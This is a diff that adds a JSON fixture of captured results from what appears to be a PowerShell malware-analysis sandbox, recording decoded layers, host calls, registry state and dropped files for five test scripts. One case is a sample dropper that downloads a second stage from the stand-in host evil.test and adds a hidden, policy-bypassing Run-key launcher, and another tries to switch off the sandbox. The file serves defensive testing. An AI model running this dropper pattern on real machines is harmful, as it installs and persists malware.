@@ -1,0 +1,549 @@
+{
+  "capturedWith": "scripts/husk/wasm-spike",
+  "cases": [
+    {
+      "name": "layered-iex",
+      "note": "The core case: base64 inside IEX, recovered as a layer and executed.",
+      "script": "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V3JpdGUtSG9zdCAiaGVsbG8gaHVzayI=')))",
+      "result": {
+        "output": "hello husk\n",
+        "error": "",
+        "completed": true,
+        "layers": [
+          "Write-Host \"hello husk\""
+        ]
+      },
+      "hostCalls": [],
+      "registry": [
+        {
+          "path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender",
+          "values": [
+            {
+              "name": "InstallLocation",
+              "value": "C:\\ProgramData\\Microsoft\\Windows Defender",
+              "seeded": true
+            }
+          ]
+        },
+        {
+          "path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+          "values": [
+            {
+              "name": "ProductName",
+              "value": "Windows 10 Pro",
+              "seeded": true
+            },
+            {
+              "name": "CurrentVersion",
+              "value": "6.3",
+              "seeded": true
+            },
+            {
+              "name": "CurrentBuild",
+              "value": "19045",
+              "seeded": true
+            },
+            {
+              "name": "InstallDate",
+              "value": "1600000000",
+              "seeded": true
+            },
+            {
+              "name": "RegisteredOwner",
+              "value": "analyst",
+              "seeded": true
+            }
+          ]
+        },
+        {
+          "path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
+          "values": [
+            {
+              "name": "AppData",
+              "value": "C:\\Users\\analyst\\AppData\\Roaming",
+              "seeded": true
+            },
+            {
+              "name": "Local AppData",
+              "value": "C:\\Users\\analyst\\AppData\\Local",
+              "seeded": true
+            },
+            {
+              "name": "Desktop",
+              "value": "C:\\Users\\analyst\\Desktop",
+              "seeded": true
+            },
+            {
+              "name": "Startup",
+              "value": "C:\\Users\\analyst\\Start Menu\\Programs\\Startup",
+              "seeded": true
+            },
+            {
+              "name": "Personal",
+              "value": "C:\\Users\\analyst\\Documents",
+              "seeded": true
+            }
+          ]
+        }
+      ],
+      "dropped": []
+    },
+    {
+      "name": "dropper",
+      "note": "A commodity dropper shape: download, drop, persist, launch.",
+      "script": "$u='http://evil.test/stage2.ps1'; $p=\"$env:APPDATA\\Updater.ps1\"; (New-Object Net.WebClient).DownloadFile($u,$p); Set-Content -Path 'C:\\Users\\Public\\note.txt' -Value 'dropped'; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Updater -Value \"powershell -w hidden -ep bypass -f $p\"; Start-Process 'powershell.exe' -ArgumentList '-enc','SQBFAFgA'",
+      "result": {
+        "output": "",
+        "error": "System.Diagnostics.Process is not supported on this platform.",
+        "completed": true,
+        "layers": []
+      },
+      "hostCalls": [
+        {
+          "seq": 0,
+          "op": "network.download",
+          "native": "Net.WebClient.DownloadFile",
+          "args": [
+            "http://evil.test/stage2.ps1",
+            "C:\\Users\\analyst\\AppData\\Roaming\\Updater.ps1"
+          ],
+          "source": "proxy"
+        },
+        {
+          "seq": 1,
+          "op": "filesystem.write",
+          "native": "Net.WebClient.DownloadFile",
+          "args": [
+            "C:\\Users\\analyst\\AppData\\Roaming\\Updater.ps1"
+          ],
+          "source": "proxy"
+        },
+        {
+          "seq": 2,
+          "op": "filesystem.write",
+          "native": "Set-Content",
+          "args": [
+            "Path=C:\\Users\\Public\\note.txt",
+            "Value=dropped"
+          ],
+          "source": "cmdlet"
+        },
+        {
+          "seq": 3,
+          "op": "registry.write",
+          "native": "Set-ItemProperty",
+          "args": [
+            "Path=HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "Name=Updater",
+            "Value=powershell -w hidden -ep bypass -f C:\\Users\\analyst\\AppData\\Roaming\\Updater.ps1"
+          ],
+          "source": "cmdlet"
+        },
+        {
+          "seq": 4,
+          "op": "registry.write",
+          "native": "Registry::SetProperty",
+          "args": [
+            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "Updater",
+            "powershell -w hidden -ep bypass -f C:\\Users\\analyst\\AppData\\Roaming\\Updater.ps1"
+          ],
+          "source": "provider"
+        },
+        {
+          "seq": 5,
+          "op": "process.start",
+          "native": "Start-Process",
+          "args": [
+            "ArgumentList=-enc,SQBFAFgA",
+            "FilePath=powershell.exe"
+          ],
+          "source": "cmdlet"
+        }
+      ],
+      "registry": [
+        {
+          "path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender",
+          "values": [
+            {
+              "name": "InstallLocation",
+              "value": "C:\\ProgramData\\Microsoft\\Windows Defender",
+              "seeded": true
+            }
+          ]
+        },
+        {
+          "path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+          "values": [
+            {
+              "name": "ProductName",
+              "value": "Windows 10 Pro",
+              "seeded": true
+            },
+            {
+              "name": "CurrentVersion",
+              "value": "6.3",
+              "seeded": true
+            },
+            {
+              "name": "CurrentBuild",
+              "value": "19045",
+              "seeded": true
+            },
+            {
+              "name": "InstallDate",
+              "value": "1600000000",
+              "seeded": true
+            },
+            {
+              "name": "RegisteredOwner",
+              "value": "analyst",
+              "seeded": true
+            }
+          ]
+        },
+        {
+          "path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
+          "values": [
+            {
+              "name": "AppData",
+              "value": "C:\\Users\\analyst\\AppData\\Roaming",
+              "seeded": true
+            },
+            {
+              "name": "Local AppData",
+              "value": "C:\\Users\\analyst\\AppData\\Local",
+              "seeded": true
+            },
+            {
+              "name": "Desktop",
+              "value": "C:\\Users\\analyst\\Desktop",
+              "seeded": true
+            },
+            {
+              "name": "Startup",
+              "value": "C:\\Users\\analyst\\Start Menu\\Programs\\Startup",
+              "seeded": true
+            },
+            {
+              "name": "Personal",
+              "value": "C:\\Users\\analyst\\Documents",
+              "seeded": true
+            }
+          ]
+        },
+        {
+          "path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "values": [
+            {
+              "name": "Updater",
+              "value": "powershell -w hidden -ep bypass -f C:\\Users\\analyst\\AppData\\Roaming\\Updater.ps1",
+              "seeded": false
+            }
+          ]
+        }
+      ],
+      "dropped": [
+        {
+          "path": "/husk-c/Users/Public/note.txt",
+          "size": 8,
+          "sha256": "05a2bf1d7bde149ffa950e6e0e56409eba44337568a487c8a2781b089f35b6cd",
+          "head": "64726f707065640a"
+        }
+      ]
+    },
+    {
+      "name": "pinvoke-declaration",
+      "note": "Add-Type cannot run here; the C# source and its imports are the evidence.",
+      "script": "Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class W { [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d); }'",
+      "result": {
+        "output": "",
+        "error": "",
+        "completed": true,
+        "layers": []
+      },
+      "hostCalls": [
+        {
+          "seq": 6,
+          "op": "assembly.define-type",
+          "native": "Add-Type",
+          "args": [
+            "using System.Runtime.InteropServices; public class W { [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d); }"
+          ],
+          "source": "proxy"
+        },
+        {
+          "seq": 7,
+          "op": "assembly.pinvoke",
+          "native": "Add-Type DllImport",
+          "args": [
+            "kernel32.dll"
+          ],
+          "source": "proxy"
+        }
+      ],
+      "registry": [
+        {
+          "path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender",
+          "values": [
+            {
+              "name": "InstallLocation",
+              "value": "C:\\ProgramData\\Microsoft\\Windows Defender",
+              "seeded": true
+            }
+          ]
+        },
+        {
+          "path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+          "values": [
+            {
+              "name": "ProductName",
+              "value": "Windows 10 Pro",
+              "seeded": true
+            },
+            {
+              "name": "CurrentVersion",
+              "value": "6.3",
+              "seeded": true
+            },
+            {
+              "name": "CurrentBuild",
+              "value": "19045",
+              "seeded": true
+            },
+            {
+              "name": "InstallDate",
+              "value": "1600000000",
+              "seeded": true
+            },
+            {
+              "name": "RegisteredOwner",
+              "value": "analyst",
+              "seeded": true
+            }
+          ]
+        },
+        {
+          "path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
+          "values": [
+            {
+              "name": "AppData",
+              "value": "C:\\Users\\analyst\\AppData\\Roaming",
+              "seeded": true
+            },
+            {
+              "name": "Local AppData",
+              "value": "C:\\Users\\analyst\\AppData\\Local",
+              "seeded": true
+            },
+            {
+              "name": "Desktop",
+              "value": "C:\\Users\\analyst\\Desktop",
+              "seeded": true
+            },
+            {
+              "name": "Startup",
+              "value": "C:\\Users\\analyst\\Start Menu\\Programs\\Startup",
+              "seeded": true
+            },
+            {
+              "name": "Personal",
+              "value": "C:\\Users\\analyst\\Documents",
+              "seeded": true
+            }
+          ]
+        }
+      ],
+      "dropped": []
+    },
+    {
+      "name": "budget-exhausted",
+      "note": "A delay loop. The run is a partial result, not an error.",
+      "script": "$i = 0; while ($true) { try { $i++ } catch { } }",
+      "result": {
+        "output": "",
+        "error": "husk: time budget exhausted after 10000 ms",
+        "completed": false,
+        "layers": []
+      },
+      "hostCalls": [],
+      "registry": [
+        {
+          "path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender",
+          "values": [
+            {
+              "name": "InstallLocation",
+              "value": "C:\\ProgramData\\Microsoft\\Windows Defender",
+              "seeded": true
+            }
+          ]
+        },
+        {
+          "path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+          "values": [
+            {
+              "name": "ProductName",
+              "value": "Windows 10 Pro",
+              "seeded": true
+            },
+            {
+              "name": "CurrentVersion",
+              "value": "6.3",
+              "seeded": true
+            },
+            {
+              "name": "CurrentBuild",
+              "value": "19045",
+              "seeded": true
+            },
+            {
+              "name": "InstallDate",
+              "value": "1600000000",
+              "seeded": true
+            },
+            {
+              "name": "RegisteredOwner",
+              "value": "analyst",
+              "seeded": true
+            }
+          ]
+        },
+        {
+          "path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
+          "values": [
+            {
+              "name": "AppData",
+              "value": "C:\\Users\\analyst\\AppData\\Roaming",
+              "seeded": true
+            },
+            {
+              "name": "Local AppData",
+              "value": "C:\\Users\\analyst\\AppData\\Local",
+              "seeded": true
+            },
+            {
+              "name": "Desktop",
+              "value": "C:\\Users\\analyst\\Desktop",
+              "seeded": true
+            },
+            {
+              "name": "Startup",
+              "value": "C:\\Users\\analyst\\Start Menu\\Programs\\Startup",
+              "seeded": true
+            },
+            {
+              "name": "Personal",
+              "value": "C:\\Users\\analyst\\Documents",
+              "seeded": true
+            }
+          ]
+        }
+      ],
+      "dropped": []
+    },
+    {
+      "name": "tamper",
+      "note": "Trying to turn the sandbox off is itself an indicator.",
+      "script": "[System.Management.Automation.HuskHostHook]::SetBlockNetwork($false); [System.Management.Automation.HuskHostHook]::SetSinks($null,$null); 'tampered'",
+      "result": {
+        "output": "tampered",
+        "error": "",
+        "completed": true,
+        "layers": []
+      },
+      "hostCalls": [
+        {
+          "seq": 8,
+          "op": "evasion.sandbox",
+          "native": "HuskHostHook.SetBlockNetwork",
+          "args": [
+            "refused: configuration is sealed"
+          ],
+          "source": "binder"
+        },
+        {
+          "seq": 9,
+          "op": "evasion.sandbox",
+          "native": "HuskHostHook.SetSinks",
+          "args": [
+            "refused: configuration is sealed"
+          ],
+          "source": "binder"
+        }
+      ],
+      "registry": [
+        {
+          "path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender",
+          "values": [
+            {
+              "name": "InstallLocation",
+              "value": "C:\\ProgramData\\Microsoft\\Windows Defender",
+              "seeded": true
+            }
+          ]
+        },
+        {
+          "path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+          "values": [
+            {
+              "name": "ProductName",
+              "value": "Windows 10 Pro",
+              "seeded": true
+            },
+            {
+              "name": "CurrentVersion",
+              "value": "6.3",
+              "seeded": true
+            },
+            {
+              "name": "CurrentBuild",
+              "value": "19045",
+              "seeded": true
+            },
+            {
+              "name": "InstallDate",
+              "value": "1600000000",
+              "seeded": true
+            },
+            {
+              "name": "RegisteredOwner",
+              "value": "analyst",
+              "seeded": true
+            }
+          ]
+        },
+        {
+          "path": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
+          "values": [
+            {
+              "name": "AppData",
+              "value": "C:\\Users\\analyst\\AppData\\Roaming",
+              "seeded": true
+            },
+            {
+              "name": "Local AppData",
+              "value": "C:\\Users\\analyst\\AppData\\Local",
+              "seeded": true
+            },
+            {
+              "name": "Desktop",
+              "value": "C:\\Users\\analyst\\Desktop",
+              "seeded": true
+            },
+            {
+              "name": "Startup",
+              "value": "C:\\Users\\analyst\\Start Menu\\Programs\\Startup",
+              "seeded": true
+            },
+            {
+              "name": "Personal",
+              "value": "C:\\Users\\analyst\\Documents",
+              "seeded": true
+            }
+          ]
+        }
+      ],
+      "dropped": []
+    }
+  ]
+}
